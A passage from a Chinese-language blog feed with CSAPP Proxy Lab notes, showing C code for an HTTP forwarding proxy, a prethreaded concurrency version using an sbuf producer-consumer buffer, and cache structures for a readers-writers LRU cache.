punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>MAXLINE<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//这里不是很懂,最后转发给服务器的uri只留下文件路径?</span>    <span class="token function">snprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">*</span>MAXLINE<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token string">"%s %s %s\r\n"</span><span class="token punctuation">,</span>requestline<span class="token operator">-</span><span class="token operator">></span>method<span class="token punctuation">,</span>requestline<span class="token operator">-</span><span class="token operator">></span>path<span class="token punctuation">,</span>requestline<span class="token operator">-</span><span class="token operator">></span>version<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Rio_writen</span><span class="token punctuation">(</span>server_fd<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>headers_num<span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">snprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">*</span>MAXLINE<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token string">"%s: %s\r\n"</span><span class="token punctuation">,</span>requestheaders<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span>requestheaders<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">Rio_writen</span><span class="token punctuation">(</span>server_fd<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">Rio_writen</span><span class="token punctuation">(</span>server_fd<span class="token punctuation">,</span><span class="token string">"\r\n"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">Forward2Client</span><span class="token punctuation">(</span><span class="token keyword">int</span> client_fd<span class="token punctuation">,</span><span class="token keyword">int</span> server_fd<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> headers_num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>MAXLINE<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    rio_t server_rio<span class="token punctuation">;</span>    <span class="token keyword">int</span> size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span>PREFIX_PRINT<span class="token string">"Forwarding to Client,ing...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Rio_readinitb</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>server_rio<span class="token punctuation">,</span>server_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Rio_readlineb</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>server_rio<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>MAXLINE<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Rio_writen</span><span class="token punctuation">(</span>client_fd<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// headers_num = read_requesthdrs(&amp;server_rio,headers);</span>    <span class="token function">Rio_readlineb</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>server_rio<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>MAXLINE<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">Rio_writen</span><span class="token punctuation">(</span>client_fd<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">Rio_readlineb</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>server_rio<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>MAXLINE<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">Rio_writen</span><span class="token punctuation">(</span>client_fd<span class="token punctuation">,</span><span class="token string">"\r\n"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>size <span class="token operator">=</span> <span class="token function">Rio_readlineb</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>server_rio<span class="token punctuation">,</span>buf<span class="token punctuation">,</span>MAXLINE<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">Rio_writen</span><span class="token punctuation">(</span>client_fd<span class="token punctuation">,</span>buf<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">void</span><span class="token operator">*</span> <span class="token function">StartWork</span><span class="token punctuation">(</span><span class="token keyword">int</span> connfd<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">,</span>uri<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    RequestLine requestline<span class="token punctuation">;</span>    RequestHeader requestheaders<span class="token punctuation">[</span>MAX_HEADERS<span class="token punctuation">]</span><span class="token punctuation">;</span>    rio_t client_rio<span class="token punctuation">;</span>    <span class="token keyword">int</span> server_fd<span class="token punctuation">;</span>    <span class="token function">Rio_readinitb</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>client_rio<span class="token punctuation">,</span>connfd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">Rio_readlineb</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>client_rio<span class="token punctuation">,</span>buf<span class="token punctuation">,</span>MAXLINE<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//writeup中提到这里有个多行请求行的问题,待处理</span>    <span class="token comment" spellcheck="true">/*     Ideally  your  HTTP  request  parser  will  be  fullyrobust according to the relevant sections of RFC 1945, except for one detail: while the specification allowsfor multiline request fields     */</span>    <span class="token function">sscanf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token string">"%s %s %s"</span><span class="token punctuation">,</span>requestline<span class="token punctuation">.</span>method<span class="token punctuation">,</span>uri<span class="token punctuation">,</span>requestline<span class="token punctuation">.</span>version<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> headers_num <span class="token operator">=</span> <span class="token function">read_requesthdrs</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>client_rio<span class="token punctuation">,</span>requestheaders<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_uri</span><span class="token punctuation">(</span>uri<span class="token punctuation">,</span><span class="token operator">&amp;</span>requestline<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">add_headers</span><span class="token punctuation">(</span>requestheaders<span class="token punctuation">,</span><span class="token operator">&amp;</span>headers_num<span class="token punctuation">,</span><span class="token string">"Host"</span><span class="token punctuation">,</span>requestline<span class="token punctuation">.</span>host<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">add_headers</span><span class="token punctuation">(</span>requestheaders<span class="token punctuation">,</span><span class="token operator">&amp;</span>headers_num<span class="token punctuation">,</span><span class="token string">"User-Agent"</span><span class="token punctuation">,</span>user_agent_hdr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">add_headers</span><span class="token punctuation">(</span>requestheaders<span class="token punctuation">,</span><span class="token operator">&amp;</span>headers_num<span class="token punctuation">,</span><span class="token string">"Connection"</span><span class="token punctuation">,</span><span class="token string">"close"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">add_headers</span><span class="token punctuation">(</span>requestheaders<span class="token punctuation">,</span><span class="token operator">&amp;</span>headers_num<span class="token punctuation">,</span><span class="token string">"Proxy-Connection"</span><span class="token punctuation">,</span><span class="token string">"close"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    server_fd <span class="token operator">=</span> <span class="token function">open_clientfd</span><span class="token punctuation">(</span>requestline<span class="token punctuation">.</span>host<span class="token punctuation">,</span>requestline<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span>PREFIX_PRINT<span class="token string">"Connect to %s:%s.(serverFd: %d)\n"</span><span class="token punctuation">,</span>requestline<span class="token punctuation">.</span>host<span class="token punctuation">,</span>requestline<span class="token punctuation">.</span>port<span class="token punctuation">,</span>server_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Write2Server</span><span class="token punctuation">(</span>server_fd<span class="token punctuation">,</span><span class="token operator">&amp;</span>requestline<span class="token punctuation">,</span>requestheaders<span class="token punctuation">,</span>headers_num<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Forward2Client</span><span class="token punctuation">(</span>connfd<span class="token punctuation">,</span>server_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> listenfd<span class="token punctuation">,</span>connfd<span class="token punctuation">;</span>    <span class="token keyword">char</span> client_hostname<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> client_port<span class="token punctuation">[</span>MAX_PORTLEN<span class="token punctuation">]</span><span class="token punctuation">;</span>    socklen_t clientlen<span class="token punctuation">;</span>    <span class="token keyword">struct</span> sockaddr_storage clientaddr<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>argc<span class="token operator">!=</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span>PREFIX_PRINT<span class="token string">"usage: %s &lt;port>\n"</span><span class="token punctuation">,</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    listenfd <span class="token operator">=</span> <span class="token function">open_listenfd</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        clientlen <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>clientaddr<span class="token punctuation">)</span><span class="token punctuation">;</span>        connfd <span class="token operator">=</span> <span class="token function">accept</span><span class="token punctuation">(</span>listenfd<span class="token punctuation">,</span><span class="token punctuation">(</span>SA<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>clientaddr<span class="token punctuation">,</span><span class="token operator">&amp;</span>clientlen<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">Getnameinfo</span><span class="token punctuation">(</span><span class="token punctuation">(</span>SA<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>clientaddr<span class="token punctuation">,</span>clientlen<span class="token punctuation">,</span>client_hostname<span class="token punctuation">,</span>MAXLINE<span class="token punctuation">,</span>client_port<span class="token punctuation">,</span>MAX_PORTLEN<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span>PREFIX_PRINT<span class="token string">"Acceptd connection from (%s,%s),clientFd: %d\n"</span><span class="token punctuation">,</span>client_hostname<span class="token punctuation">,</span>client_port<span class="token punctuation">,</span>connfd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">StartWork</span><span class="token punctuation">(</span>connfd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="Part-B-2"><a href="#Part-B-2" class="headerlink" title="Part B"></a>Part B</h2><p>并发做的是预线程化的方式.照书上实现了sbuf包实现对client_fd(connfd)的管理.将之前程序中的StartWork作为线程例程.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306251624471.png"></p><h3 id="sbuf包"><a href="#sbuf包" class="headerlink" title="sbuf包"></a>sbuf包</h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">ifndef</span> SBUF_H</span><span class="token macro property">#<span class="token directive keyword">define</span> SBUF_H</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;semaphore.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span><span class="token operator">*</span> buf<span class="token punctuation">;</span>    <span class="token keyword">int</span> count<span class="token punctuation">;</span>    <span class="token keyword">int</span> front<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//buf[(front+1)%count]为第一个item</span>    <span class="token keyword">int</span> rear<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//buf[rear%count]为最后一个元素</span>    sem_t mutex<span class="token punctuation">;</span>    sem_t slots<span class="token punctuation">;</span>    sem_t items<span class="token punctuation">;</span><span class="token punctuation">}</span>sbuf_t<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">sbuf_init</span><span class="token punctuation">(</span>sbuf_t<span class="token operator">*</span> sp<span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">sbuf_deinit</span><span class="token punctuation">(</span>sbuf_t<span class="token operator">*</span> sp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">sbuf_insert</span><span class="token punctuation">(</span>sbuf_t<span class="token operator">*</span> sp<span class="token punctuation">,</span><span class="token keyword">int</span> item<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">sbuf_remove</span><span class="token punctuation">(</span>sbuf_t<span class="token operator">*</span> sp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">endif</span></span><span class="token keyword">void</span> <span class="token function">sbuf_init</span><span class="token punctuation">(</span>sbuf_t <span class="token operator">*</span>sp<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">{</span>    sp<span class="token operator">-</span><span class="token operator">></span>buf <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    sp<span class="token operator">-</span><span class="token operator">></span>count <span class="token operator">=</span> n<span class="token punctuation">;</span>    sp<span class="token operator">-</span><span class="token operator">></span>front <span class="token operator">=</span> sp<span class="token operator">-</span><span class="token operator">></span>rear <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">sem_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sp<span class="token operator">-</span><span class="token operator">></span>mutex<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sem_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sp<span class="token operator">-</span><span class="token operator">></span>slots<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sem_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sp<span class="token operator">-</span><span class="token operator">></span>items<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">sbuf_deinit</span><span class="token punctuation">(</span>sbuf_t <span class="token operator">*</span>sp<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">free</span><span class="token punctuation">(</span>sp<span class="token operator">-</span><span class="token operator">></span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">sbuf_insert</span><span class="token punctuation">(</span>sbuf_t <span class="token operator">*</span>sp<span class="token punctuation">,</span> <span class="token keyword">int</span> item<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">sem_wait</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sp<span class="token operator">-</span><span class="token operator">></span>slots<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sem_wait</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sp<span class="token operator">-</span><span class="token operator">></span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>    sp<span class="token operator">-</span><span class="token operator">></span>buf<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">++</span>sp<span class="token operator">-</span><span class="token operator">></span>rear<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">(</span>sp<span class="token operator">-</span><span class="token operator">></span>count<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> item<span class="token punctuation">;</span>    <span class="token function">sem_post</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sp<span class="token operator">-</span><span class="token operator">></span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sem_post</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sp<span class="token operator">-</span><span class="token operator">></span>items<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">sbuf_remove</span><span class="token punctuation">(</span>sbuf_t <span class="token operator">*</span>sp<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> item<span class="token punctuation">;</span>    <span class="token function">sem_wait</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sp<span class="token operator">-</span><span class="token operator">></span>items<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sem_wait</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sp<span class="token operator">-</span><span class="token operator">></span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>    item <span class="token operator">=</span> sp<span class="token operator">-</span><span class="token operator">></span>buf<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">++</span>sp<span class="token operator">-</span><span class="token operator">></span>front<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">(</span>sp<span class="token operator">-</span><span class="token operator">></span>count<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">sem_post</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sp<span class="token operator">-</span><span class="token operator">></span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sem_post</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sp<span class="token operator">-</span><span class="token operator">></span>slots<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> item<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> listenfd<span class="token punctuation">,</span>connfd<span class="token punctuation">;</span>    <span class="token keyword">char</span> client_hostname<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> client_port<span class="token punctuation">[</span>MAX_PORTLEN<span class="token punctuation">]</span><span class="token punctuation">;</span>    socklen_t clientlen<span class="token punctuation">;</span>    <span class="token keyword">struct</span> sockaddr_storage clientaddr<span class="token punctuation">;</span>    pthread_t tid<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>argc<span class="token operator">!=</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span>PREFIX_PRINT<span class="token string">"usage: %s &lt;port>\n"</span><span class="token punctuation">,</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">sbuf_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sbuf<span class="token punctuation">,</span>SBUFSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>NTHREADS<span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span>        <span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tid<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span>StartWork<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        listenfd <span class="token operator">=</span> <span class="token function">open_listenfd</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        clientlen <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>clientaddr<span class="token punctuation">)</span><span class="token punctuation">;</span>        connfd <span class="token operator">=</span> <span class="token function">accept</span><span class="token punctuation">(</span>listenfd<span class="token punctuation">,</span><span class="token punctuation">(</span>SA<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>clientaddr<span class="token punctuation">,</span><span class="token operator">&amp;</span>clientlen<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">Getnameinfo</span><span class="token punctuation">(</span><span class="token punctuation">(</span>SA<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>clientaddr<span class="token punctuation">,</span>clientlen<span class="token punctuation">,</span>client_hostname<span class="token punctuation">,</span>MAXLINE<span class="token punctuation">,</span>client_port<span class="token punctuation">,</span>MAX_PORTLEN<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span>PREFIX_PRINT<span class="token string">"Acceptd connection from (%s,%s),clientFd: %d\n"</span><span class="token punctuation">,</span>client_hostname<span class="token punctuation">,</span>client_port<span class="token punctuation">,</span>connfd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sbuf_insert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sbuf<span class="token punctuation">,</span>connfd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="Part-C-1"><a href="#Part-C-1" class="headerlink" title="Part C"></a>Part C</h2><p>类似于Cache lab的设计,读写cache使用的是读者优先的读者-写者模型.要注意的一点是读者读完后其实也会进行写(更新lru),所以也要上锁.<br>想清楚读者-写者模型的特征,每一个地方上锁是为了避免怎样的竞争,之后便可以根据需求做出变化.</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> uri<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> content_type<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> data<span class="token punctuation">;</span>    <span class="token keyword">char</span> server<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    size_t size<span class="token punctuation">;</span>    size_t lru<span class="token punctuation">;</span><span class="token punctuation">}</span>CacheLine<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>    CacheLine<span class="token operator">*</span> cachelines<span class="token punctuation">;</span>    size_t current_lru<span class="token punctuation">;</span>    size_t cache_num<span class="token punctuation">;</span>    size_t cache_size<span class="token punctuation">;</span><span class="token punctuation">}</span>Cache<span class="token punctuation">;</span></code></pre><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306271005363.png"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP--Notes</title>
      <link href="/2023/06/25/CSAPP--Notes/"/>
      <url>/2023/06/25/CSAPP--Notes/</url>
      
